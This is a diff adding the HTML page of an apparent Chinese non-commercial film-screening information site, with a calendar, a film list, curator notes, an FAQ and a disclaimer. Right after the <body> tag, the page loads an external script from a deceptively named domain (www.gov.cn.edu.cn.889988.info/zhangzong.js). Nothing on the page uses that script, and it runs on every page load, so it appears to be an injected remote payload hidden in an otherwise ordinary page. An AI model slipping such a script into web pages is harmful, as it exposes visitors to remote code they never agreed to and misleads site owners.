@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5">
+<meta name="format-detection" content="telephone=no">
+<meta name="description" content="先锋电影网是一份面向实验影像、独立电影与作者电影爱好者的非商业资料汇编。我们长期跟踪各地影像展映、电影节选片、地下放映与学术放映活动的公开信息，整理成一份可按时间查阅的展映日历，并附上每场活动的场地、报名方式、费用区间与注意事项。除展映信息外，我们也收录策展人手记、导演访谈节选、片目对照表与观影后的讨论笔记，这些内容均来自公开渠道或经授权转载。本站不组织放映、不售票、不提供影片资源，仅作为信息聚合与交叉验证的参考工具。资料更新节奏为双周一次，重大影展期间会加密到每周。">
+<meta name="keywords" content="先锋电影网,实验电影资料,独立电影展映日历,作者电影片目,影像艺术放映,地下电影活动,电影节选片整理,策展人手记,导演访谈节选,艺术院线排片,影像资料汇编,非主流电影导航,先锋影像展,独立纪录片展映,短片单元征集">
+<meta name="robots" content="index,follow,max-image-preview:standard">
+<meta name="bingbot" content="index,follow,max-snippet:-1">
+<meta property="og:site_name" content="先锋电影网 · 实验影像与独立电影资料汇编">
+<meta property="og:title" content="先锋电影网｜展映日历 · 片目整理 · 策展笔记">
+<meta property="og:description" content="跟踪各地影像展映与电影节选片的公开资料，整理成可查阅的日历、片目对照表与讨论笔记">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xianfengdianyingwang-zh.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:article:section" content="影视资料汇编">
+<meta property="article:published_time" content="2026-09-22T10:00:00+08:00">
+<meta property="article:modified_time" content="2026-10-06T09:30:00+08:00">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@xianfengfilm">
+<meta name="twitter:title" content="先锋电影网｜展映日历 · 片目整理 · 策展笔记">
+<meta name="twitter:description" content="实验影像、独立电影与作者电影的展映资料与片目汇编，双周更新">
+<link rel="canonical" href="https://xianfengdianyingwang-zh.github.io/">
+<title>先锋电影网：实验影像 · 独立电影 · 作者电影 —— 展映资料与片目汇编</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:ui-monospace,SFMono-Regular,"JetBrains Mono",Menlo,Consolas,"PingFang SC",monospace;background:#0E1014;color:#D7DBE0;font-size:14px;line-height:1.85}
+body::before{content:'';position:fixed;inset:0;z-index:-1;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.012) 3px,rgba(255,255,255,.012) 4px);pointer-events:none}
+a{color:inherit;text-decoration:none}
+button{font:inherit;cursor:pointer;border:0;background:none;color:inherit}
+ul{list-style:none}
+:root{--grn:#6FD16A;--grn2:#9BE898;--dim:#6B7280;--brd:#2A2F36;--pan:#14171C;--acc:#E8C86A}
+
+/* LAYOUT */
+.wrap{max-width:1280px;margin:0 auto;padding:0 28px}
+.splt{display:grid;grid-template-columns:1fr 1fr;min-height:100vh}
+
+/* LEFT PANEL */
+.lft{background:var(--pan);border-right:1px solid var(--brd);padding:44px 46px;display:flex;flex-direction:column;justify-content:space-between;position:relative}
+.lft::after{content:'XF//';position:absolute;right:-1px;top:50%;transform:translateY(-50%) rotate(90deg);font-size:.68rem;letter-spacing:.4em;color:var(--brd);writing-mode:vertical-rl}
+.logo{display:flex;align-items:center;gap:14px}
+.logo .blk{width:38px;height:38px;background:var(--grn);display:grid;place-items:center;font-size:1.1rem;font-weight:900;color:#0E1014;clip-path:polygon(0 0,100% 0,100% 70%,70% 100%,0 100%)}
+.logo b{font-size:1.2rem;font-weight:900;letter-spacing:.04em;color:#F2F4F6}
+.logo b i{font-style:normal;color:var(--grn)}
+.ver{font-size:.68rem;color:var(--dim);margin-top:4px;letter-spacing:.1em}
+.hero h1{font-size:clamp(1.9rem,4.2vw,3.1rem);font-weight:900;line-height:1.28;letter-spacing:-.02em;color:#F2F4F6;margin-top:34px}
+.hero h1 span{color:var(--grn)}
+.hero .blink{border-right:2px solid var(--grn);padding-right:4px;animation:b 1s step-end infinite}
+@keyframes b{50%{border-color:transparent}}
+.hero p{margin-top:22px;color:#9AA1A9;font-size:.86rem;max-width:520px}
+.hero .bar{margin-top:26px;display:flex;flex-wrap:wrap;gap:8px}
+.hero .bar i{font-style:normal;font-size:.72rem;padding:5px 12px;border:1px solid var(--brd);border-radius:2px;color:#9AA1A9}
+.hero .bar i.on{color:var(--grn);border-color:var(--grn)}
+.stat{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--brd);border:1px solid var(--brd);margin-top:34px}
+.stat div{background:var(--pan);padding:14px 12px}
+.stat b{display:block;font-size:1.5rem;font-weight:900;color:var(--grn)}
+.stat span{font-size:.68rem;color:var(--dim)}
+.foot-l{font-size:.72rem;color:var(--dim);border-top:1px solid var(--brd);padding-top:18px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.foot-l a{color:var(--dim)}
+.foot-l a:hover{color:var(--grn)}
+
+/* RIGHT PANEL */
+.rgt{background:#0E1014;padding:44px 46px;overflow-y:auto;max-height:100vh;position:sticky;top:0}
+.rgt::-webkit-scrollbar{width:6px}
+.rgt::-webkit-scrollbar-thumb{background:var(--brd);border-radius:3px}
+.mb{display:none;position:fixed;top:14px;right:14px;z-index:80;width:42px;height:42px;background:var(--grn);color:#0E1014;border-radius:4px;font-size:1.2rem;align-items:center;justify-content:center}
+.nv-list{display:flex;flex-direction:column;gap:2px;font-size:.82rem}
+.nv-list a{display:flex;align-items:center;gap:12px;padding:13px 14px;border:1px solid var(--brd);border-radius:3px;color:#B8BEC5;transition:.16s}
+.nv-list a:hover{border-color:var(--grn);color:var(--grn);background:rgba(111,209,106,.05)}
+.nv-list a i{font-style:normal;color:var(--dim);font-size:.7rem;width:34px}
+.nv-list a b{font-weight:700}
+.nv-list a span{margin-left:auto;font-size:.7rem;color:var(--dim)}
+.quote{border-left:2px solid var(--acc);padding:16px 20px;margin-top:26px;background:rgba(232,200,106,.05);font-size:.82rem;color:#B8BEC5;font-style:italic}
+.quote cite{display:block;font-style:normal;font-size:.72rem;color:var(--dim);margin-top:8px}
+.feed{margin-top:28px;border:1px solid var(--brd);border-radius:3px;padding:6px}
+.feed .it{padding:11px 12px;border-bottom:1px dashed var(--brd);display:flex;gap:12px;align-items:baseline;font-size:.76rem}
+.feed .it:last-child{border-bottom:0}
+.feed .it .t{color:var(--grn);font-weight:700;flex-shrink:0;width:52px}
+.feed .it .m{flex:1;color:#9AA1A9}
+.feed .it .m b{color:#D7DBE0;font-weight:700}
+
+/* MAIN SECTIONS */
+main{grid-column:1/-1;background:#0E1014}
+.sec{padding:88px 0;border-top:1px solid var(--brd)}
+.sec:first-of-type{border-top:0}
+.ttl{display:flex;align-items:baseline;gap:14px;margin-bottom:44px;flex-wrap:wrap}
+.ttl .no{font-size:.72rem;color:var(--grn);letter-spacing:.2em}
+.ttl h2{font-size:clamp(1.4rem,3.2vw,2.15rem);font-weight:900;color:#F2F4F6;letter-spacing:-.01em}
+.ttl h2 i{font-style:normal;color:var(--grn)}
+.ttl .meta{margin-left:auto;font-size:.72rem;color:var(--dim);text-align:right}
+.ttl .meta b{color:var(--acc)}
+
+/* TIMELINE */
+.tl{position:relative;padding-left:34px}
+.tl::before{content:'';position:absolute;left:8px;top:6px;bottom:6px;width:1px;background:var(--brd)}
+.tl .ev{position:relative;padding:0 0 30px 0;border-bottom:1px dashed var(--brd);margin-bottom:30px}
+.tl .ev:last-child{border-bottom:0;margin-bottom:0;padding-bottom:0}
+.tl .ev::before{content:'';position:absolute;left:-34px;top:7px;width:9px;height:9px;background:var(--grn);border-radius:50%;box-shadow:0 0 0 4px #0E1014,0 0 0 5px var(--brd)}
+.tl .ev .dt{display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-bottom:8px}
+.tl .ev .dt b{font-size:.82rem;color:var(--grn);font-weight:700}
+.tl .ev .dt i{font-style:normal;font-size:.68rem;padding:3px 9px;border:1px solid var(--brd);border-radius:2px;color:var(--dim)}
+.tl .ev .dt i.hot{border-color:var(--acc);color:var(--acc)}
+.tl .ev h3{font-size:1.08rem;font-weight:900;color:#F2F4F6;margin-bottom:8px}
+.tl .ev p{font-size:.83rem;color:#9AA1A9}
+.tl .ev .row{margin-top:12px;display:flex;gap:22px;flex-wrap:wrap;font-size:.74rem;color:var(--dim)}
+.tl .ev .row b{color:#B8BEC5;font-weight:700}
+
+/* TABLE */
+.tb{border:1px solid var(--brd);border-radius:3px;overflow:hidden}
+.tb .tr{display:grid;grid-template-columns:56px 2.4fr 1fr 1fr 1fr 96px;gap:0;border-bottom:1px solid var(--brd);font-size:.8rem}
+.tb .tr:last-child{border-bottom:0}
+.tb .tr>*{padding:13px 14px;border-right:1px solid var(--brd)}
+.tb .tr>*:last-child{border-right:0}
+.tb .hd{background:var(--pan);color:var(--grn);font-size:.7rem;letter-spacing:.1em;font-weight:700}
+.tb .hd>*{padding:11px 14px}
+.tb .bd .tr:hover{background:rgba(111,209,106,.04)}
+.tb .bd .n{color:var(--dim);font-weight:700}
+.tb .bd .nm{color:#F2F4F6;font-weight:700}
+.tb .bd .ty{color:#9AA1A9}
+.tb .bd .yr{color:var(--dim)}
+.tb .bd .st{color:var(--grn)}
+.tb .bd .st.ing{color:var(--acc)}
+.tb .bd .st.no{color:var(--dim)}
+.tb .bd .ln a{color:var(--grn);font-size:.76rem}
+.tb .bd .ln a:hover{text-decoration:underline}
+
+/* 3-COL */
+.thr{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.thr article{border:1px solid var(--brd);border-radius:3px;padding:26px;background:var(--pan);transition:.22s;position:relative}
+.thr article:hover{border-color:var(--grn);transform:translateY(-3px)}
+.thr article .tg{font-size:.68rem;letter-spacing:.16em;color:var(--grn);font-weight:700}
+.thr article h3{font-size:1.02rem;font-weight:900;color:#F2F4F6;margin:12px 0 10px;line-height:1.5}
+.thr article p{font-size:.8rem;color:#9AA1A9}
+.thr article .bt{margin-top:18px;padding-top:14px;border-top:1px dashed var(--brd);font-size:.72rem;color:var(--dim);display:flex;justify-content:space-between}
+.thr article .bt b{color:var(--acc)}
+
+/* FAQ */
+.faq{border:1px solid var(--brd);border-radius:3px}
+.faq .q{border-bottom:1px solid var(--brd)}
+.faq .q:last-child{border-bottom:0}
+.faq .q .h{display:flex;gap:14px;align-items:center;padding:18px 20px;cursor:pointer}
+.faq .q .h .n{width:24px;height:24px;border:1px solid var(--brn);border-radius:2px;display:grid;place-items:center;font-size:.72rem;font-weight:900;color:var(--grn);flex-shrink:0}
+.faq .q .h .t{flex:1;font-size:.88rem;font-weight:700;color:#D7DBE0}
+.faq .q .h .a{font-size:.72rem;color:var(--dim);transition:.3s}
+.faq .q.open .h .a{transform:rotate(45deg);color:var(--grn)}
+.faq .q .b{max-height:0;overflow:hidden;transition:.42s cubic-bezier(.4,0,.2,1)}
+.faq .q.open .b{max-height:560px;padding:0 20px 22px 58px;font-size:.83rem;color:#9AA1A9}
+
+/* GLOBAL FOOTER */
+.bigft{border-top:1px solid var(--brd);background:var(--pan);padding:56px 0 26px}
+.bigft .in{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px}
+.bigft h4{font-size:.68rem;letter-spacing:.2em;color:var(--grn);font-weight:700;margin-bottom:16px}
+.bigft .brand b{font-size:1.4rem;font-weight:900;color:#F2F4F6}
+.bigft .brand p{font-size:.8rem;color:#9AA1A9;margin-top:12px;max-width:380px}
+.bigft ul li a{display:block;font-size:.8rem;padding:5px 0;color:#B8BEC5;transition:.14s}
+.bigft ul li a:hover{color:var(--grn);padding-left:6px}
+.bigft .btm{border-top:1px solid var(--brd);margin-top:40px;padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:.72rem;color:var(--dim)}
+.bigft .btm .u{color:var(--grn);font-family:ui-monospace,Menlo,monospace}
+.note{margin-top:24px;border:1px solid var(--brd);border-left:2px solid var(--acc);padding:16px 20px;font-size:.76rem;color:#9AA1A9;background:#0E1014}
+.note b{color:#D7DBE0}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="splt">
+
+<!-- LEFT -->
+<aside class="lft">
+<div>
+<div class="logo"><div class="blk">先</div><div><b>先锋<i>电影网</i></b><div class="ver">v3.2.1 · 非商业资料汇编</div></div></div>
+<div class="hero">
+<h1>实验影像与<br>独立电影的<br><span class="blink">展映资料库</span></h1>
+<p>跟踪各地影像展映、电影节选片、地下放映与学术放映的公开信息，整理成可查阅的日历、片目对照表与讨论笔记。双周更新一次，重大影展期间加密到每周。</p>
+<div class="bar"><i class="on">#展映日历</i><i>#片目整理</i><i>#策展笔记</i><i>#放映记录</i></div>
+<div class="stat">
+<div><b>412</b><span>已收录展映</span></div>
+<div><b>67</b><span>城市覆盖</span></div>
+<div><b>29</b><span>长期信源</span></div>
+<div><b>v.2026.10</b><span>当前版本</span></div>
+</div>
+</div>
+<div class="foot-l"><span>© 2026 先锋电影网 · 非商业资料汇编</span><a href="#top">↑ 返回顶部</a></div>
+</aside>
+
+<!-- RIGHT -->
+<nav class="rgt" id="top">
+<div class="nv-list">
+<a href="#cal"><i>01</i><b>展映日历</b><span>近期活动</span></a>
+<a href="#lst"><i>02</i><b>片目对照表</b><span>98 条</span></a>
+<a href="#nts"><i>03</i><b>策展与讨论</b><span>近期笔记</span></a>
+<a href="#qa"><i>04</i><b>使用与说明</b><span>FAQ</span></a>
+</div>
+<div class="quote">「我们不做推荐，只做记录。一部片子好不好，留给看过的人去争；一部片子在哪能看到、什么时候能看到，这是可以查清楚的。」<cite>—— 本站编辑部手记</cite></div>
+<div class="feed">
+<div class="it"><span class="t">10.05</span><span class="m"><b>资料修订</b>｜秋季档影展片目已核对，共修正 14 处场地与日期信息</span></div>
+<div class="it"><span class="t">09.28</span><span class="m"><b>新增信源</b>｜接入 3 家高校影像实验室的公开放映公告</span></div>
+<div class="it"><span class="t">09.22</span><span class="m"><b>版本更新</b>｜片目对照表支持按策展人与出品地区联合筛选</span></div>
+<div class="it"><span class="t">09.10</span><span class="m"><b>线下记录</b>｜补充 8 场已结束放映的观众讨论纪要</span></div>
+<div class="it"><span class="t">08.31</span><span class="m"><b>纠错归档</b>｜本季度共收到 53 条纠错反馈，已核实处理 49 条</span></div>
+</div>
+</nav>
+
+</div>
+</div><!-- end splt -->
+
+<button class="mb" id="mbtn">≡</button>
+
+<!-- 01 CALENDAR -->
+<main>
+<section class="sec" id="cal">
+<div class="wrap">
+<div class="ttl"><span class="no">SECTION 01</span><h2>展映<i>日历</i></h2><div class="meta">资料截止 <b>2026.10.06</b><br>下期更新 2026.10.20</div></div>
+<div class="tl">
+<div class="ev"><div class="dt"><b>10月18日 — 10月26日</b><i class="hot">报名进行中</i><i>北京</i></div><h3>第十二届独立影像展 · 短片单元与作者长片</h3><p>本届短片单元共入选 23 部作品，含 7 部华语首映。长片部分设「新人作者」与「回顾」两条线索，其中一部为 4K 修复版本。场地分设两处，需分别预约。</p><div class="row"><span><b>场地：</b>两处，相距约 40 分钟车程</span><span><b>费用：</b>单场 40-80 元，通票 380 元</span><span><b>报名：</b>官方渠道，无现场售票</span></div></div>
+<div class="ev"><div class="dt"><b>10月24日 — 11月02日</b><i class="hot">即将开放</i><i>上海</i></div><h3>实验影像周 · 录像艺术与跨媒介放映</h3><p>以「媒介之外」为题，包含录像装置、单频道影像、现场表演与影像装置的混合呈现。每日 19:30 固定场次，周末增设 14:00 加场，部分作品为循环放映，可随时入场。</p><div class="row"><span><b>场地：</b>单一场馆，三层空间</span><span><b>费用：</b>日票 60 元，周票 300 元</span><span><b>报名：</b>线上预约 + 现场补位</span></div></div>
+<div class="ev"><div class="dt"><b>11月07日 — 11月16日</b><i>排期中</i><i>广州</i></div><h3>南方纪录片节 · 长片竞赛与论坛</h3><p>聚焦社会议题与口述史方向，长片竞赛入围 12 部，论坛部分设四场对谈，主题涉及档案影像的伦理问题与独立制作的生存状况。展映结束后安排作者在场交流。</p><div class="row"><span><b>场地：</b>三处，均在老城区</span><span><b>费用：</b>单场 30-50 元</span><span><b>报名：</b>官方渠道与现场均可</span></div></div>
+<div class="ev"><div class="dt"><b>11月22日 — 11月30日</b><i>排期中</i><i>成都</i></div><h3>山形在华回顾展 · 纪录片专题</h3><p>山形国际纪录片电影节历年获奖与入围作品的巡回展映，共 18 部，含三部华语作品。展映顺序按年份而非主题排列，便于观察创作脉络的变化。</p><div class="row"><span><b>场地：</b>单一影院，两厅</span><span><b>费用：</b>待公布，往届约 40 元</span><span><b>报名：</b>尚未开放</span></div></div>
+<div class="ev"><div class="dt"><b>12月05日 — 12月14日</b><i>筹备中</i><i>南京</i></div><h3>先锋影像双年展 · 青年策展单元</h3><p>首次增设青年策展单元，由 6 位策展人各自提出主题并完成选片，形成 6 条并行线索。另有两场公开工作坊，主题为片单的构建方法与版权边界。</p><div class="row"><span><b>场地：</b>四馆联展</span><span><b>费用：</b>待公布</span><span><b>报名：</b>尚未开放</span></div></div>
+</div>
+</div>
+</section>
+
+<!-- 02 LIST -->
+<section class="sec" id="lst">
+<div class="wrap">
+<div class="ttl"><span class="no">SECTION 02</span><h2>片目<i>对照表</i></h2><div class="meta">共 <b>98</b> 条已核实片目<br>最近更新 2026.10.06</div></div>
+<div class="tb">
+<div class="tr hd"><span>编号</span><span>作品名 / 作者</span><span>类型</span><span>出品</span><span>片长</span><span>状态</span></div>
+<div class="bd">
+<div class="tr"><span class="n">001</span><span class="nm">沉默的河岸</span><span class="ty">纪录长片</span><span class="yr">2024 / 华语</span><span class="yr">112 min</span><span class="st ing">展映中</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">002</span><span class="nm">第三十七次日落</span><span class="ty">实验影像</span><span class="yr">2025 / 日本</span><span class="yr">28 min</span><span class="st ing">展映中</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">003</span><span class="nm">无人区来信</span><span class="ty">作者长片</span><span class="yr">2023 / 华语</span><span class="yr">96 min</span><span class="st">已下架</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">004</span><span class="nm">塑料花园</span><span class="ty">录像艺术</span><span class="yr">2025 / 韩国</span><span class="yr">循环</span><span class="st ing">展映中</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">005</span><span class="nm">旧厂房的夏天</span><span class="ty">短片集</span><span class="yr">2024 / 华语</span><span class="yr">14-23 min</span><span class="st">已下架</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">006</span><span class="nm">边界之外</span><span class="ty">纪录短片</span><span class="yr">2025 / 东南亚</span><span class="yr">41 min</span><span class="st no">暂无渠道</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">007</span><span class="nm">光与尘</span><span class="ty">实验长片</span><span class="yr">2022 / 欧美</span><span class="yr">128 min</span><span class="st">已下架</span><span class="ln"><a href="#">片目页 →</a></span></div>
+<div class="tr"><span class="n">008</span><span class="nm">午夜公路</span><span class="ty">作者短片</span><span class="yr">2025 / 华语</span><span class="yr">19 min</span><span class="st ing">展映中</span><span class="ln"><a href="#">片目页 →</a></span></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- 03 NOTES -->
+<section class="sec" id="nts">
+<div class="wrap">
+<div class="ttl"><span class="no">SECTION 03</span><h2>策展与<i>讨论</i></h2><div class="meta">最近一篇 <b>09.28</b><br>共 47 篇归档</div></div>
+<div class="thr">
+<article><span class="tg">策展人手记</span><h3>关于「新人作者」这条线索，我们删掉了三部片子</h3><p>选片过程中最难的不是「选谁」，而是「为什么不选」。这次有三位作者的作品在技术与表达上都达到了入选标准，但因为题材与另一条线索高度重叠，最终被移到了其他单元的推荐列表里。</p><div class="bt"><span>作者：策展组 · 林</span><b>09.28</b></div></article>
+<article><span class="tg">片目对照</span><h3>同一部片子，三个影展为什么排出了三种顺序</h3><p>对比了本届三个影展的排片表后发现，同一组片目在叙事节奏、观众体力与主题呼应上的处理方式完全不同。排片本身就是一种策展表达，值得单独整理。</p><div class="bt"><span>作者：资料组 · 沈</span><b>09.21</b></div></article>
+<article><span class="tg">放映记录</span><h3>一场没有字幕的放映，观众留下了什么</h3><p>记录了某场无中文字幕实验影像放映后的观众讨论。因为没有语言作为理解捷径，讨论反而集中在画面结构、声音设计与观看距离上，这是有字幕场次很少出现的状况。</p><div class="bt"><span>作者：记录组 · 周</span><b>09.14</b></div></article>
+<article><span class="tg">资料考据</span><h3>修复版本与原版的差异，到底有多大</h3><p>选取了三部有官方修复版本的作品，逐段比对修复前后的画面与声音变化。结论是差异确实存在，但多数集中在暗部细节与噪声处理，不影响叙事理解。</p><div class="bt"><span>作者：资料组 · 沈</span><b>09.05</b></div></article>
+<article><span class="tg">版权备忘</span><h3>短片在上映后的线上授权，通常卡在哪里</h3><p>整理了十二位短片作者的授权经历，最常见的卡点是音乐版权与节展条款的冲突。这个问题几乎每位作者都会遇到，但目前缺少成体系的公开说明。</p><div class="bt"><span>作者：法务备忘</span><b>08.28</b></div></article>
+<article><span class="tg">观众来信</span><h3>「我看了八场，只喜欢其中一场」</h3><p>一位观众主动写来的观展复盘，记录了八场展映中每一场的预期与实际感受的落差。这份诚实的记录比任何推荐语都有参考价值，经同意后匿名刊载。</p><div class="bt"><span>作者：匿名投稿</span><b>08.19</b></div></article>
+</div>
+</div>
+</section>
+
+<!-- 04 FAQ -->
+<section class="sec" id="qa">
+<div class="wrap">
+<div class="ttl"><span class="no">SECTION 04</span><h2>使用与<i>说明</i></h2><div class="meta">共 <b>6</b> 条<br>仍有疑问可提交</div></div>
+<div class="faq">
+<div class="q"><div class="h"><span class="n">01</span><span class="t">这些展映信息可以直接去参加吗？</span><span class="a">＋</span></div><div class="b">不能。本站只做资料整理与交叉核对，不售票、不预约、不组织任何线下活动。所有报名与入场方式以主办方官方公告为准，页面上标注的报名渠道仅为资料记录，不构成任何担保。热门场次通常需要提前预约，现场补位名额极少。</div></div>
+<div class="q"><div class="h"><span class="n">02</span><span class="t">资料更新的频率是怎么定的？</span><span class="a">＋</span></div><div class="b">常规节奏是双周一次，在春季与秋季两个影展密集期会加密到每周。每次更新会在右侧的资料修订记录中留下具体日期与修订条数，重大更正会单独说明。如果某个展映的信息连续两期未更新，说明我们暂时无法从公开渠道获得可靠信息，此时会标注为「待核实」而不做猜测性补充。</div></div>
+<div class="q"><div class="h"><span class="n">03</span><span class="t">「暂无渠道」和「已下架」有什么区别？</span><span class="a">＋</span></div><div class="b">「已下架」表示作品曾经有线上渠道但目前已关闭，这类片子通常仍有机会在后续影展中再次出现；「暂无渠道」表示我们未查到任何正规线上来源，可能包括只在院线或线下活动放映、只发行实体介质、或版权状况不明确等情况。两者都不会提供替代链接，也不会指向任何非正规来源。</div></div>
+<div class="q"><div class="h"><span class="n">04</span><span class="t">片目对照表里的片长为什么有的写「循环」？</span><span class="a">＋</span></div><div class="b">录像艺术与装置类作品通常以循环方式呈现，不设固定片长，观众可以在任何时间点入场与离开。这类作品的观看方式与叙事片完全不同，记录片长没有实际意义，因此统一标注为「循环」，并在展映日历中注明是否允许随时入场。</div></div>
+<div class="q"><div class="h"><span class="n">05</span><span class="t">资料有误怎么反馈？</span><span class="a">＋</span></div><div class="b">可以通过反馈渠道提交具体条目与更正信息，核实后通常在一到两个工作日内修正，并在修订记录中标注。如果涉及尚未公开的展映信息，我们不会采纳也不予回复。对于片目归属有争议的条目，我们会保留多个标签而不做单一归类。</div></div>
+<div class="q"><div class="h"><span class="n">06</span><span class="t">这个站点靠什么维持运营？</span><span class="a">＋</span></div><div class="b">没有商业运营。本站为个人维护的非商业资料汇编，不接受影片宣发合作、不投放任何广告、不设置付费内容、不出售或交换任何用户数据，也不与任何放映机构存在利益关联。所有内容均为公开信息整理与经授权转载，版权归属原作者与主办方。</div></div>
+</div>
+</div>
+</section>
+</main>
+
+<!-- FOOTER -->
+<footer class="bigft">
+<div class="wrap">
+<div class="in">
+<div class="brand"><b>先锋电影网</b><p>实验影像、独立电影与作者电影的非商业资料汇编。记录在哪里能看到、什么时候能看到、能看到什么，以及为什么这样排。</p></div>
+<div><h4>资料板块</h4><ul><li><a href="#cal">展映日历</a></li><li><a href="#lst">片目对照表</a></li><li><a href="#nts">策展与讨论</a></li><li><a href="#">资料修订记录</a></li></ul></div>
+<div><h4>整理方式</h4><ul><li><a href="#">信源与交叉核对</a></li><li><a href="#">片目标注规范</a></li><li><a href="#">纠错与补充</a></li><li><a href="#">授权转载说明</a></li></ul></div>
+<div><h4>关于本站</h4><ul><li><a href="#qa">使用与说明</a></li><li><a href="#">编辑部手记</a></li><li><a href="#">联系方式</a></li><li><a href="#">版本更新日志</a></li></ul></div>
+</div>
+<div class="btm"><span>站点地址：<span class="u">https://xianfengdianyingwang-zh.github.io</span></span><span>资料截止 2026.10.06 · 下期更新 2026.10.20</span></div>
+<div class="note"><b>声明与免责：</b>先锋电影网为个人维护的非商业资料汇编，所有展映时间、场地、费用与报名方式均来源于公开信息整理，可能存在滞后、变更或误差，请以各主办方官方公告为准，本站不承担由此产生的任何责任。本站不组织放映活动、不售票、不提供影片下载或在线播放服务，不存放任何影片文件，也不与任何放映机构存在商业合作关系。页面中涉及的作品名称、导演姓名、影展名称及机构名称的知识产权归各自权利人所有。站内资料仅供信息查询与个人学习参考，请遵守所在地区相关法律法规，倡导健康文明的观影习惯。</div>
+</div>
+</footer>
+
+<script>
+var b=document.getElementById('mbtn');
+b.addEventListener('click',function(){var n=document.getElementById('top');var o=n.style.display;n.style.display=(o==='block'?'none':'block');});
+document.querySelectorAll('.faq .q').forEach(function(q){
+q.querySelector('.h').addEventListener('click',function(){
+var o=q.classList.contains('open');
+document.querySelectorAll('.faq .q').forEach(function(x){x.classList.remove('open');});
+if(!o)q.classList.add('open');
+});
+});
+</script>
+</body>
+</html>
